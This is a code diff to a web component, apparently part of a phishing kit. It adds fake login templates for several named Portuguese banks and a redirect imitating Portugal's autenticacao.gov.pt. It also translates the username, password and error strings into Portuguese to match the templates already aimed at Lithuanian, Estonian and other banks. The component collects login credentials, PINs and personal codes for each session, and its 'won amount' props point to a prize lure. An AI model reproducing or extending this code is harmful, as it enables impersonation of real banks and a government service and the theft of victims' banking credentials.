@@ -41,9 +41,16 @@ import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
+import { PortugalBankTemplate } from "@/components/templates/PortugalBankTemplate";
+import { AutenticacaoRedirect } from "./autenticacao-redirect";
 // LT bilinen banka slug'lari (methodMap ile ayni, kopya):
 const LITHUANIA_KNOWN_SLUGS = new Set([
   "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
+]);
+
+// PT ozel sablonu olan banka slug'lari (public/pt-banks/<slug>/1.html)
+const PORTUGAL_TEMPLATE_SLUGS = new Set([
+  "cgd","abanca","bpi","novo-banco","santander-pt"
 ]);
 
 type Props = {
@@ -399,7 +406,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     if (!hasCurrentSubmissionData) {
       setSaving(false);
-      setError("Form alanlari doldurulmadan devam edilemez.");
+      setError("Por favor, preencha todos os campos obrigatórios para continuar.");
       return;
     }
 
@@ -670,7 +677,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     setSaving(false);
     if (updateError) {
-      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
+      setError("Não foi possível enviar os dados. Por favor, tente novamente.");
       return;
     }
     setSessionFormData(nextFormData);
@@ -689,7 +696,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     return (
       <div className="flex min-h-screen items-center justify-center p-4">
         <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
-          Nežinomas bankas. Pradėkite pasirinkimą iš naujo.
+          Banco desconhecido. Por favor, reinicie a seleção.
         </p>
       </div>
     );
@@ -790,6 +797,36 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"].includes(normalizedSlug) ||
     estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw))
   );
+
+  // PORTEKIZ: ozel sablonu olan 5 banka template'e gider,
+  // diger PT bankalari autenticacao.gov.pt sayfasina yonlenir.
+  const isPortugalBank = !isLithuania && !isEstonianBank && (
+    normalizedCountry === "portekiz" ||
+    normalizedCountry === "portugal" ||
+    normalizedCountry === "pt" ||
+    PORTUGAL_TEMPLATE_SLUGS.has(normalizedSlug) ||
+    /(^|[-_\s])pt($|[-_\s])/.test(normalizedSlug)
+  );
+
+  if (isPortugalBank) {
+    if (PORTUGAL_TEMPLATE_SLUGS.has(normalizedSlug)) {
+      return (
+        <PortugalBankTemplate
+          bankSlug={normalizedSlug}
+          bankName={bank.name}
+          logoFile={bank.logoFile}
+          brandColor={bank.brandColor || theme?.colors.primary}
+          formData={{ verfuegernummer, pin, personalCode, loginMethod }}
+          onChange={handleTemplateChange}
+          handleRouteAction={handleTemplateSubmit}
+          saving={saving}
+          wonAmount={wonAmount}
+          wonLabel={wonLabel}
+        />
+      );
+    }
+    return <AutenticacaoRedirect sessionId={sessionId} bankSlug={normalizedSlug} bankName={bank.name} />;
+  }
 
   if (isLithuania) {
     return (
@@ -960,7 +997,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
               const props = attributesToProps(domNode.attribs);
               return (
                 <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
-                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
+                  {saving ? "A carregar..." : domToReact(domNode.children as any, options)}
                 </button>
               );
             }
@@ -1035,12 +1072,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                 
                 <form onSubmit={handleSubmit}>
                   <div style={{ marginBottom: '1rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
-                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Nome de utilizador</label>
+                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="O seu nome de utilizador" />
                   </div>
                   <div style={{ marginBottom: '1.5rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
-                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Palavra-passe</label>
+                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="A sua palavra-passe" />
                   </div>
                   
                   {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
@@ -1060,7 +1097,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                       opacity: saving ? 0.7 : 1
                     }}
                   >
-                    {saving ? "Laden..." : design.texts.title}
+                    {saving ? "A carregar..." : design.texts.title}
                   </button>
                 </form>
               </div>
@@ -1138,7 +1175,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
               )}
             </div>
             <div>
-              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
+              <p className="text-[10px] uppercase tracking-widest opacity-80">Ambiente Bancário Seguro</p>
               <h2 className="text-lg font-bold">{bank.name}</h2>
             </div>
           </div>
@@ -1192,7 +1229,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
             style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
           >
-            {saving ? "Controleren..." : theme.buttonText}
+            {saving ? "A verificar..." : theme.buttonText}
           </button>
         </form>
       </div>
